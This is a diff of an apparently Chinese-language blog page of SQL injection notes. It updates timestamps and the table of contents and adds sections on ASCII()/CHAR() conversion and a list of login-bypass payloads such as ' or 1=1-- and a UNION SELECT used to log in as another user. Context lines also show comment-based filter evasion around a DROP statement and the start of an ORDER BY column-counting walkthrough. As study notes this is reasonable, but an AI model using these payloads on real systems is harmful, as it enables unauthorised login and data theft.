@@ -28,7 +28,7 @@
 <meta property="og:description" content="直道相思了无益">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-01-30T03:18:14.000Z">
-<meta property="article:modified_time" content="2021-03-07T11:41:09.616Z">
+<meta property="article:modified_time" content="2021-03-10T11:48:44.118Z">
 <meta property="article:author" content="Havisham">
 <meta name="twitter:card" content="summary">
 
@@ -181,7 +181,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-07 19:41:09" itemprop="dateModified" datetime="2021-03-07T19:41:09+08:00">2021-03-07</time>
+                <time title="修改时间：2021-03-10 19:48:44" itemprop="dateModified" datetime="2021-03-10T19:48:44+08:00">2021-03-10</time>
               </span>
 
           
@@ -210,7 +210,23 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DROP&#x2F;*comment*&#x2F;sampletable&#96; </span><br><span class="line">DR&#x2F;**&#x2F;OP&#x2F;*绕过过滤*&#x2F;sampletable&#96; </span><br><span class="line">SELECT&#x2F;*替换空格*&#x2F;password&#x2F;**&#x2F;FROM&#x2F;**&#x2F;Members</span><br></pre></td></tr></table></figure>
 <ul>
-<li><code>/*! MYSQL专属 */</code><h3 id="无过滤情况下有回显手工注入"><a href="#无过滤情况下有回显手工注入" class="headerlink" title="无过滤情况下有回显手工注入"></a>无过滤情况下有回显手工注入</h3><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4></li>
+<li><code>/*! MYSQL专属 */</code></li>
+</ul>
+<h3 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h3><p>在注入脚本中经常需要字符串与数字之间的相互转换。</p>
+<ul>
+<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
+<li><code>CHAR()</code>：把整数转换为对应的字符</li>
+</ul>
+<h3 id="后台万能密码"><a href="#后台万能密码" class="headerlink" title="后台万能密码"></a>后台万能密码</h3><ul>
+<li><code>admin&#39; --</code></li>
+<li><code>admin&#39; #</code></li>
+<li><code>admin&#39;/*</code></li>
+<li><code>&#39; or 1=1--</code></li>
+<li><code>&#39; or 1=1#</code></li>
+<li><code>&#39; or 1=1/*</code></li>
+<li><code>&#39;) or &#39;1&#39;=&#39;1--</code></li>
+<li><code>&#39;) or (&#39;1&#39;=&#39;1--</code></li>
+<li>以不同的用户登陆 <code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code><h3 id="无过滤情况下有回显手工注入"><a href="#无过滤情况下有回显手工注入" class="headerlink" title="无过滤情况下有回显手工注入"></a>无过滤情况下有回显手工注入</h3><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4></li>
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id = 1 order by 1 <span class="comment">#正确回显</span></span><br><span class="line">id = 1 order by 2 <span class="comment">#正确回显</span></span><br><span class="line">id = 1 order by 3 <span class="comment">#报错提示没有字段数</span></span><br></pre></td></tr></table></figure>
 
@@ -313,7 +329,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%8C%E9%97%B4%E6%B3%A8%E9%87%8A"><span class="nav-number">1.</span> <span class="nav-text">行间注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%8C%E5%86%85%E6%B3%A8%E9%87%8A"><span class="nav-number">2.</span> <span class="nav-text">行内注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5%E4%B8%8B%E6%9C%89%E5%9B%9E%E6%98%BE%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">无过滤情况下有回显手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.2.</span> <span class="nav-text">使用联合查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.3.</span> <span class="nav-text">查询所有数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%A1%A8%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">3.4.</span> <span class="nav-text">查询特定数据库的表的信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="nav-number">3.5.</span> <span class="nav-text">查询特定数据库中特定数据表的字段信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E7%89%B9%E5%AE%9A%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="nav-number">3.6.</span> <span class="nav-text">查询特定数据库中特定数据表的特定字段内容</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%8C%E9%97%B4%E6%B3%A8%E9%87%8A"><span class="nav-number">1.</span> <span class="nav-text">行间注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%8C%E5%86%85%E6%B3%A8%E9%87%8A"><span class="nav-number">2.</span> <span class="nav-text">行内注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">字符串编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">后台万能密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5%E4%B8%8B%E6%9C%89%E5%9B%9E%E6%98%BE%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">无过滤情况下有回显手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">5.1.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">5.2.</span> <span class="nav-text">使用联合查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">5.3.</span> <span class="nav-text">查询所有数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%A1%A8%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">5.4.</span> <span class="nav-text">查询特定数据库的表的信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="nav-number">5.5.</span> <span class="nav-text">查询特定数据库中特定数据表的字段信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E7%89%B9%E5%AE%9A%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="nav-number">5.6.</span> <span class="nav-text">查询特定数据库中特定数据表的特定字段内容</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
